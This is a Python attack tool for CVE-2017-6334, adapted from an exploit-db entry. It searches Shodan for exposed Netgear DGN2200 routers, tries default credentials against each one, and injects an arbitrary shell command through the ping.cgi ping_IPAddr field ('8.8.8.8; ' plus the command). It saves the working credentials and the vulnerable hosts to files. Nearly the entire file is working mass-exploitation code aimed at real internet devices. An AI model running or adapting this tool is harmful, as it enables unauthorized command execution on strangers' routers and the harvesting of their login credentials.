import sys
import requests,socket
import argparse
import shodan

sys.path.append("../../misc/")
import ColorPrint

def search_shodan(SHODAN_API_KEY,query):
    api = shodan.Shodan(SHODAN_API_KEY)
    # Search Shodan
    try:
        ColorPrint.PrintColor(ColorPrint.INFO, "Searching Shodan, this may take a while...")
        results = api.search(query)
        filename = "Shodan_[" + query + "].txt"
        file = open(filename, "w+")

        for result in results['matches']:
            output = result["ip_str"]+":"+str(result["port"])+"\n"
            file.write(output)
            #print(result["ip_str"])
        file.close()
        return filename

    except:
        raise shodan.APIError


def fuzz(cmd,login,password,filename,auto_flag):
    creds = False
    file = open(filename, "r")
    cred_file = open(filename+"_harvested_creds.txt", "w+")
    vuln_file = open(filename+"_vuln_routers.txt", "w+")
    counter = 0
    for host in file:
        host = host.split('\n')[0]
        ColorPrint.PrintColor(ColorPrint.INFO, "Trying: {}".format(host))
        if counter % 10 == 0:
            if auto_flag:
                pass
            else:
                input()
        try:
            value = "http://" + host + "/ping.cgi"
            #print(value)
            response = requests.post(value,data={'IPAddr1': 8, 'IPAddr2': 8, 'IPAddr3': 8, 'IPAddr4': 8,
                                                 'ping':"Ping", 'ping_IPAddr':"8.8.8.8; " + cmd},auth=(login, password),
                                                timeout=10, headers={'referer': "http://192.168.0.1/DIAG_diag.htm"})
            if response.status_code == 200:
                ColorPrint.PrintColor(ColorPrint.SUCCESS, "Found Credentials", host+"::"+login+":"+password, 14)
                cred_file.write(host + "::"+login + ":"+ password + "\n")
                creds = True
            elif response.status_code == 401:
                ColorPrint.PrintColor(ColorPrint.FAILED, "Invalid Credentials", "Unable to login to " + host+"::"+login+":"+password, 11)
            else:
                ColorPrint.PrintColor(ColorPrint.WARN, "Retrieved uncaught status code: "+ response.status_code, host, 11)

            if "test" in response.text and creds:
                ColorPrint.PrintColor(ColorPrint.SUCCESS, "Router is vulnerable",host,11)
                vuln_file.write(host + "::" + login + ":" + password + "\n")
            elif creds or response.status_code == 404:
                ColorPrint.PrintColor(ColorPrint.FAILED, "Router is not vulnerable", host, 11)
            counter += 1
            creds = False

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except socket.timeout:
            ColorPrint.PrintColor(ColorPrint.WARN, "Unable to connect", host, 11)
            pass
        except requests.Timeout:
            ColorPrint.PrintColor(ColorPrint.WARN, "Unable to connect", host, 11)
            pass
        except:
            pass
    file.close()
    cred_file.close()
    vuln_file.close()

def assign_args():
    global flags

    if not len(sys.argv[1:]):
        art = """

    ███████╗██╗   ██╗███████╗███████╗██╗   ██╗██████╗ ██████╗ ██╗ ██████╗██╗  ██╗
    ██╔════╝██║   ██║╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██║██╔════╝██║ ██╔╝
    █████╗  ██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ ██████╔╝██████╔╝██║██║     █████╔╝ 
    ██╔══╝  ██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  ██╔══██╗██╔══██╗██║██║     ██╔═██╗ 
    ██║     ╚██████╔╝███████╗███████╗   ██║   ██████╔╝██║  ██║██║╚██████╗██║  ██╗
    ╚═╝      ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ v1.0
                                                                                 
    Discover actual vulnerable Netgear DGN2200 devices!
          CVE-2017-6334 
          NETGEAR DGN2200v1/v2/v3/v4
          Remote Command Execution (ping.cgi)
    
    Source:
    https://www.exploit-db.com/exploits/41459/
    
    Adapted By: 
    MidnightSeer
    
"""
        print(art)
        print("Help: -h or --help to view the help menu")
        sys.exit(0)
    else:

        parser = argparse.ArgumentParser(description="Netgear Fuzzer",
                                         formatter_class=argparse.RawDescriptionHelpFormatter,
                                         epilog='''Examples:
                {} --hostfile -u 'admin' -p 'admin' --cmd 'ls'
                
                By Default: 
                
                Username    - admin
                Password    - password
                Cmd         - echo '<test>'
                Query       - DGN2200
                '''.format(sys.argv[0]))
        group1 = parser.add_mutually_exclusive_group(required=True)
        group1.add_argument('--hostfile', action='store', dest='tgt_file',type=str, required=False, help='List of IPs')
        group1.add_argument('--shodan-api-key', action='store', dest='api_key', type=str,
                           help="Shodan API key, it's free!!")
        group2 = parser.add_mutually_exclusive_group()
        group2.add_argument('-p', '--port', action='store', dest='port', type=str,
                            help='Password to log in with', default="password")
        group2.add_argument('-q', action='store', dest='query', type=str, default="DGN2200 port:'8080'",
                            help="Shodan search query")

        parser.add_argument('--user', action='store', dest='username', type=str, required=True,
                            help='Username to log in as',default="admin")
        parser.add_argument('--pass', action='store', dest='password', type=str, required=True,
                            help='Password to log in with', default="password")
        parser.add_argument('--cmd',action='store', dest='cmd', type=str,
                            help='Command to Test Injection', default="echo test")
        parser.add_argument('--auto', action='store_true', dest='auto_flag',
                            help='Automate the script.  By default, the script will pause every 10 tries', default=False)
        #TODO ADD OPTION TO CUSTOMIZE THE TEST



        return parser.parse_args()

def main(args):
    if args.api_key and args.query:         #Search shodan for devices
        try:
            filename = search_shodan(args.api_key,args.query)
        except shodan.APIError:
            ColorPrint.PrintColor(ColorPrint.FAILED, "Shodan Lookup Failed", "Check your internet connection" , 11)
            sys.exit(0)

    elif args.tgt_file:
        filename = args.tgt_file

    try:
        fuzz(args.cmd,args.username, args.password, filename,args.auto_flag)

    except KeyboardInterrupt:
        ColorPrint.PrintColor(ColorPrint.INFO, "Detected Keyboard Interrupt")
        sys.exit(0)
    except IOError:
        ColorPrint.PrintColor(ColorPrint.FAILED, "File Error", "Unable to read the Shodan search file", 11)
        sys.exit(0)
    except FileNotFoundError:
        print("[!] File does not exist")
        sys.exit()

    else:
        pass

if __name__ == '__main__':
    args = assign_args()
    main(args)